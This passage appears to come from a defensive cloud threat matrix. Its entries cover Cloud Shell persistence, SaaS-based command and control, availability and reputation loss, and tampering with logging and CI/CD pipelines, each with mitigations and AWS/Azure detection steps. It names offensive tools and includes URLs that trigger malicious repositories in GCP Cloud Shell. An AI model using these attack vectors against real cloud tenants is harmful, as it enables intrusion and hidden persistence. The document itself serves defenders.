**Cloud Service Label: PaaS, IaaS**


Description


Cloud Service providers like Azure and Google now offer command line interfaces directly from the web console. These interfaces are actually full fledged Docker containers in a CSP-maintained cluster. To avoid bearing the full cost of maintaining these containers, CSP’s place the container images within the customer’s own cloud storage. The Docker image as a result usually remains persistent and enables an adversary with even temporary access to the cloud console to leverage the container environment to place hidden executables and configurations that ensure access can be maintained even after an intrusion supposedly has been remediated. A reverse shell over the web protocol for example from a customer’s container will actually originate from a CSP controlled host and will not be visible in a customer’s logs nor can it be blocked by customer firewall or NSG rules.


Examples




| **Name** | **Description** |
| --- | --- |
| S2 Security | Demonstrated a proof of concept at Black Hat Training session on Google Cloud Platform. |
| Escaping the Google Cloud Shell Container | A blog on Offensi covers escaping a container hosted within Google cloud by exploiting open Docker unix sockets: one found in*/run/docker.sock*and*/google/host/var/run/docker.sock*. Once the container has been escaped, the Kubernetes pod can be re-configured to run all the containers in privileged mode. |
| GCP Git Exploits | When opening a cloud shell within GCP, the*cloudshell\_git\_repo*parameter in the URL can be used to pass in a GitHub repository that automatically launches the Python Language Server and executes malicious code hidden with the \_init\_.py file. Another example is pointing to a malicious Git repo with the following URL https*://ssh.cloud.google.com/console/editor?cloudshell\_git\_repo=https://github.com/offensi/git-poc&cloudshell\_git\_branch=master&cloudshell\_working\_dir=evilgitdirectory.* |
| GCP Go and Get | A Cloud Shell user could be tricked into executing malicious code by taking advantage of the go get cloud shell function through CVE-2019-3902 and navigating to the*https://ssh.cloud.google.com/cloudshell/editor?cloudshell\_go\_get\_repo=https://go.offensi.com/go.html.* |
| Azure Cross-Account Command Execution | A NetSPI blog covers the idea of abusing the “Contributor” role in Azure, which allows a user to download any cloud shell .IMG file, including user accounts that have the “Global Administrator” role. Malicious code could be embedded in the shell image file, re-uploaded to the Azure Storage Account, and run under the context of that said Global Admin. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Delete IMG Files in Azure Customer Storage Accounts | Customers can reset their containers whenever they want in Azure by deleting the .IMG file within their cloud console storage account. Do this especially if it is suspected an account compromise for a user has occurred. |
| Locking down IP addresses and ports | Run container images with minimal functionality, whitelist specific IP addresses and ports for required services, and remove all unnecessary tools on the machine, being a Docker container or a virtual machine. |


Detection


Detection will be nearly impossible since activities occur on non-customer controlled cloud assets. A tool like Sysdig Secure or Falco, which both monitor and secure containers and kubernetes clusters within cloud environments, has the capability to detect reverse shells with out-of-the-box rules. For example, Sysdig Secure will generate alerts based on suspicious processes being run inside containers, like*sh*or*ls*.


References


1.Proprietary S2 training materials. Presented March 5, 2020.


2.<https://sysdig.com/blog/reverse-shell-falco-sysdig-secure/>. Accessed July 28, 2020.


3.<https://www.netsparker.com/blog/web-security/understanding-reverse-shells>. Accessed July 29, 2020.


4.<https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-introduction/>. Accessed July 29, 2020.


5.<https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-4/>. Accessed July 29, 2020.


6.<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3902>. Accessed July 29, 2020.


7.<https://blog.netspi.com/attacking-azure-cloud-shell/>. Accessed July 30, 2020.


# Leveraging SaaS Applications(version 1.0)


**Cloud Service Label: SaaS, IaaS**


Description


The adversary is trying to communicate with compromised systems to control them.


Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.


Examples




| **Name** | **Description** |
| --- | --- |
| SLUB | Malware spreading unique watering hole websites and through[CVE-2018-8174](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8174)and[CVE-2019-0752](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0752). Command and Control vectors include GitHub and Slack, with much more focus on the latter. Utilizes TLS from API’s to evade detection since it is presented as normal network traffic. |
| [SaaSy\_boi](https://github.com/netskopeOSS/saasy_boi) | Proof-of-Concept project presented at DEFCON27. Purpose is to establish CnC vectors through various SaaS and social media services. Examples include Slack, Twitter, and GitHub and starts by retrieving their respective API keys. SaaSy\_boi offers file upload, download, and execute functionality, creating reverse shells, and actively taking screenshots of the compromised machine. |
| [Gcat](https://github.com/byt3bl33d3r/gcat) | Python based backdoor that uses G-mail as a CnC server. |
| [Twittor](https://github.com/PaulSec/twittor) | Python based backdoor that uses Twitter direct messages (DM’s) as a CnC server. |
| [Slackor](https://github.com/Coalfire-Research/Slackor) | A GoLang project that uses Slack as a CnC server. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Manage log data like other sensitive data | Ensure log data is protected and managed like any other confidential data source with encryption at rest and positive control. |
| Cloud Access Security Broker | Implement CASB solutions to ensure cloud resources are being properly accessed. |
| Endpoint Detection | Anti-virus or malware detection services will flag and protect against any suspicious information and files. |
| Disable unnecessary SaaS | Adversaries could potentially exploit available Enterprise SaaS the same as an open port or service on a machine. Harden, lockdown, or outright disable any SaaS that is not needed. |


Detections




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.<https://blog.trendmicro.com/trendlabs-security-intelligence/slub-gets-rid-of-github-intensifies-slack-use/>. Accessed July 9, 2020.


2.<https://www.youtube.com/watch?v=m5NxE9yZjR4>. Accessed July 9, 2020.


3.<https://github.com/netskopeOSS/saasy_boi>. Accessed July 9, 2020.


4.<https://github.com/byt3bl33d3r/gcat>. Accessed July 9, 2020.


5.<https://github.com/PaulSec/twittor>. Accessed July 9, 2020.


6.<https://github.com/Coalfire-Research/Slackor>. Accessed July 9, 2020.


# Loss of Availability(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may attempt to disrupt essential components or systems to prevent the delivering of IT services. Adversaries may leverage native Cloud API functionality to delete resources such as VMs, storage accounts or data bases. They can also use native portal capabilities to remove access accounts’ ability to control Cloud resources. As Amazon and Azure offer more edge integrated services, this disruption could also affect physical device operation and sensor collections.


Examples




| **Name** | **Description** |
| --- | --- |
| Co-Residence Identification and Resource Exhaustion | As pointed out in a research papers written by the University of California San Diego, WPI and the Massachusetts Institute of Technology, co-residence is the process of identifying cloud instances that share the same underlying physical infrastructure, despite being separated virtually. Once virtual machine co-residence has been identified it may be possible to attempt to exhaust resources of the physical host to degrade the performance of other clients VM on the host |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Utilize Templates | | Whenever possible use templates to define and create your cloud infrastructure and store a copy of those templates outside the cloud - preferably in a version controlled repo. Templates enable the quick creation of virtual infrastructure and settings to their desired state. |
| Utilize Backups | | Cloud backup services can be used to restore cloud data from a certain point of time before data was altered or destroyed. |
|  | AWS | To have a data backup in an AWS environment, AWS Backup can be used. This is a way to centralize and automate backup services, as well as enforce backup policies that might include aspects such as encryption requirements and audit the activity on the backup. The backup service is PCI and ISO compliant and is HIPAA eligible. There are different backups available: cloud-native (across all AWS services) and hybrid (across AWS and on premise data). To accomplish this a backup plan needs to be created that defines criteria on how to manage the backups (ie. how frequently to backup, how long to keep the backups, etc.), then the resources to backup are assigned. Once the resources are backed up they can be minored, modified, or restored. To get started with this information can be found here:[**https://aws.amazon.com/backup/getting-started/**](https://aws.amazon.com/backup/getting-started/)**.**For more information on the service refer here:[**https://aws.amazon.com/backup/**](https://aws.amazon.com/backup/)**.**Access to and introduction video can be found here:[**https://www.aws.training/Details/Video?id=29646**](https://www.aws.training/Details/Video?id=29646)**.** |
|  | Azure | To have a data backup in an Azure environment, Azure Backup service can be used. This allows for on-premises, Azure VMs, Azure file shares, SQL server in Azure VMs, and SAP HANA databases in Azure VMs to be backed up. There are multiple ways this can be accomplished; through the portal, PowerShell, CLI, and ARM template. From the portal a VM to be backed up can be selected, then enable to backup resource, start the backup job, monitor the backup job, and when you no longer need the deployment it can then be cleared up. Using PowerShell and CLI has the same steps (just accomplished through different commands) first a recovery service vault will be created, then the backup will need to be enabled for the service being backed up, then the backup job will need to be started, then monitored, and lastly clean up the deployment. Lastly, to deploy with the ARM template first the template has to be reviewed and edited as needed, then deploy the template, then the deployment must be validated by starting a backup job, monitoring it, and cleaning up the resources. On this page multiple tutorials can be found for backing up specific resources:[**https://docs.microsoft.com/en-us/azure/backup/tutorial-backup-vm-at-scale**](https://docs.microsoft.com/en-us/azure/backup/tutorial-backup-vm-at-scale). Full details on how to deploy backup services utilizing different resources can be found below: Portal:[**https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-portal**](https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-portal) PowerShell:[**https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-powershell**](https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-powershell) CLI:[**https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-cli**](https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-cli) ARM Template:[**https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-template**](https://docs.microsoft.com/en-us/azure/backup/quick-backup-vm-template) |
| Provide redundant servers/services | | Azure and AWS make it easy to assign redundant servers/services to the same workload that can be located in different locales and be automatically spun up based on performance criteria |


Detections




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References



1.Wait a minute! A fast, Cross-VM attack on AES Gorka Irazoqui, Mehmet Sinan Inci, Thomas Eisenbarth, and Berk Sunar Worcester Polytechnic Institute, Worcester, MA, USA – Accessed August 6,2020


2.https://cseweb.ucsd.edu/~savage/papers/CCS09.pdf. Accessed July 2, 2020.


# Loss of Reputation/Value(version 1.0)


**Cloud Service Label: IaaS, PaaS, SaaS**


Description


Consumers of cloud services and especially IaaS resources have effectively accepted responsibility (liability?) of all such resources. In the public’s view there is little distinction between an organization’s effectiveness and its ability to manage its computing resources. If cloud resources under the purview of an organization are used for malicious or salacious purposes, the damage to intuitional reputation could be immense. HB Gary, a computer security company, suffered severe reputational and financial harm after an affiliate’s website was compromised. Capitol One suffered reputational and financial harm after a former AWS employee compromised thousands of Capitol One customer’s data inside AWS S3 buckets. AWS did not seem to suffer significantly, but Capitol One shares dropped almost 7% because of the incident.


In the cloud, S3 buckets that are controlled by an organization and misconfigured to allow writes can be accessed and used by any third party to store and distribute illicit material and have the organization foot the bill.


Examples




| **Name** | **Description** |
| --- | --- |
| GhostWriter | McAfee initiative discovered thousands of S3 buckets configured to allow anonymous, unauthenticated writes among some of the largest corporations in the world. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud. |
|  | *AWS* | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | *Azure* | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | *GCP* | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Encrypt Sensitive Information | | Encrypt data stored at rest in cloud storage. Managed encryption keys can be rotated by most providers. At a minimum, ensure an incident response plan to storage breach includes rotating the keys and test for impact on client applications. |
|  | AWS | To encrypt data at rest in an AWS environment first start by configuring the IAM roles and permissions. A policy will need to be created to specify that the data is to be encrypted and then the policy is attached to the instance. Full details on how to accomplish this can be found at:**https://aws.amazon.com/blogs/security/how-to-protect-data-at-rest-with-amazon-ec2-instance-store-encryption/**. |
|  | Azure | To encrypt data at rest in an Azure environment it can be done differently depending on the cloud service the customer is utilizing. For SaaS customers this can be enabled or available on each specific service. For PaaS customers there are specific storage and application platforms that can be used. In terms of IaaS customers this can be broken down to a couple different aspects. Encrypted storage can be enabled the same as PaaS services, utilizing other Azure services. Encrypted compute allows for all managed disks, snapshots, and images to be encrypted utilizing a service managed key. The keys are stored in the Azure key vault. Full details on how to accomplish this can be found at:**https://docs.microsoft.com/en-us/azure/security/fundamentals/encryption-atrest.** |
| Filter Network Traffic | | Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP whitelisting along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data. In Azure storage resources can be tied exclusively to a particular virtual network reducing the chances that it can be accessed externally or from other cloud assets. |
|  | *AWS* | An AWS environment can be configured with network ACLs (access control lists) to allow or deny inbound and outbound traffic. This can be accomplished by accessing Amazon VPC and navigating to either inbound or outbound rules depending on the rule the user wishes to add and they can be added, removed, or edited from that panel. Full details about ACLs and how to add rules in AWS can be found here:**https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html.** |
|  | *Azure* | In Azure storage resources can be tied exclusively to a particular virtual network reducing the chances that it can be accessed externally or from other cloud assets. This can be done multiple ways including the Azure Portal, Azure PowerShell, and Azure CLI (Command Line Interface). Depending on the method used to implement this the procedure can vary, but will include the need to create a security group, create a network security group, associate that network security group with a specific subnet and then create security rules that are associated to the inbound and outbound rules for that subnet. Full details on how to configure this utilizing the various methods can be found below: Azure Portal:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic** Azure PowerShell:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-powershell** Azure CLI:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-cli** |
| Multi-Factor Authentication | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | *AWS* | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | *Azure* | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | *GCP* | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| Restrict File and Directory Permissions | | Users should have limited access to files and directories depending on their need for access. The file and directory permissions should be restricted on the basis of least privilege. |
|  | *AWS* | To manage the files and directory permissions in AWS, IAM policies can be used. This can be done by utilizing group policies and policy variables. The policy would be created specifying the folder, then the permissions attached to that folder (whether the user has access to list out the objects within the directory, if they have read permissions, if they have write permissions, etc.), lastly the group that it applies to would be specified. The users can that be added and removed from that group as needed. Full details on how this can be done is explained here:**https://aws.amazon.com/blogs/security/writing-iam-policies-grant-access-to-user-specific-folders-in-an-amazon-s3-bucket/.** |
|  | *Azure* | To manage the files and directory permissions in an Azure environment basic and advanced system defined controls. This will be dependent on the type of system being used (Windows, Linux, etc). The permissions will be set individually or by group using the system commands or controls needed.. Full details on how this can be done is explained here:**https://docs.microsoft.com/en-us/azure/storage/files/storage-files-identity-ad-ds-configure-permissions.** |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable S3 Bucket Logging | To enable CloudTrail S3 bucket logging: 1.Navigate to CloudTrail console at Go to the Amazon CloudTrail console 2.Click Trails in the API activity history pane on the left 3.Sign into AWS Management Console and open the S3 console Sign in to the AWS Management Console and open the S3 console 4.Click on a bucket under*All Buckets* 5.Click on*Properties* 6.Under*Bucket:\_<bucket\_name>\_*click*Logging* 7.Ensure*Enabled*is checked |
| Enable Azure Storage Logging | This is used to track how requests made to Azure Storage were authorized. Enabling logs provides visibility into whether a request was anonymous, made with an OAuth2.0 token, a shared key, or shared access signature (SAS). Full Azure Storage analytics logging details can be found at[**https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet**](https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet)**.** |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |
| Monitoring for Regional Activity | Tools like Splunk or even CloudSploit have the ability to alert based on region and ingest CloudTrail logs. In CloudSploit, a plugin called EC2 Max Count can be configured to alert after a certain threshold of EC2 instances is met. Real-Time Events service is another feature of CloudSploit that allows alerts for activity in unused regions. |


References


1.https://www.skyhighnetworks.com/cloud-security-blog/skyhigh-discovers-ghostwriter-a-pervasive-aws-s3-man-in-the-middle-exposure - Accessed Feb 12, 2020


2.https://www.bloomberg.com/news/articles/2019-07-29/capital-one-data-systems-breached-by-seattle-woman-u-s-says -Accessed March 2, 2020


# Manipulate Cloud Configuration(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Both Azure and AWS have numerous configuration options for security controls and logging that can be altered through their portals or through command line tools. Some of these configurations are subtle and might not be noticed even if people ae actively monitoring API logs such as AWS CloudTrail. An adversary can take advantage of these configurations such as reducing the detail of logging actions. Because most automated analytics depend on raw cloud events, reducing the frequency and detail of these events will necessarily impact the ability of analytics to recognize malicious behavior.


Examples




| **Name** | **Description** |
| --- | --- |
| Detection\_disruption | Publicly available Pacu module that allows an adversary to make one or more subtle changes to AWS logging without invoking more noticeable actions like deletion or disabling. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |


Detection


CloudTrail or Monitor will record accesses to the cloud API when changes are made to logging services.


References


1.https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details - Accessed Feb 12, 2020


# Manipulating CI/CD Pipeline(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Many cloud providers support automated integration of various Continuous Integration/Continuous Deployment tools such as Jenkins, GitLab, Travis CI, or Circle CI. However, there are downsides for faster and more efficient code releases through a CI/CD pipeline. Some include oversight and lack of testing for deployment systems. An attacker who gains permission to these services could add code that as long as it passes quality checks will likely be incorporated in cloud applications allowing code execution with the permissions of the application. Adversaries may even attempt to sign code in an attempt to thwart CI/CD security checks.


Examples




| **Name** | **Description** |
| --- | --- |
| Jenkins CVE’s | There are many related vulnerabilities related to Jenkins modules and plug-ins. They include[CVE-2016-0788](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-0788),[CVE-2017-2652](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-2652),[CVE-2015-7539](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-7539), and many others. Full list can be found on the[CVE website](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=jenkins). |
| Configuration Files | At DEFCON 25, spaceb0x covered environment variable manipulation, command injection, and malicious resource provisioning by editing public configuration files and sending them to build or deployment servers. |
| CIDER | Spaceb0x presented the Continuous Integration and Deployment Exploiter (or CIDER) at DEFCON 25, which is a framework aimed to exploit CI/CD pipelines through GitHub pull requests of both public and private source code repositories. |
| Rotten Apple | Rotten Apple is a CI/CD audit framework used to identify if the root user is being used to build projects and if attackers can deploy malicious code to steal API keys, to pivot to private networks, to authenticate using GitHub credentials, to create reverse shells, to exfiltrate data, to access other projects on the same server or to steal SSH keys. The framework also has an attack mode, which can be used for penetration testing. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Limit Permissions for Applications | If code is inserted into a CI/CD pipeline a cloud administrator is unlikely to know. By ensuring applications have only the permissions absolutely required will minimize the impact of compromise. |
| Patches and Updates | Always ensure applications used in the pipeline and the CI/CD pipeline itself are updated and patched to their most recent versions. |
| Zero Trust | Disable transitive/implied trust between applications. |


Detection


There is the potential that a code review of an application or hash comparison of application files from some trusted repo might detect additions to code. Network sockets and connections created by code could be detected by network flow logs. Scanning, monitoring, and alerting tools built into the pipeline can be utilized to notify of any malicious changes or new vulnerabilities.





| **Detection of unusual behavior after exploit** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
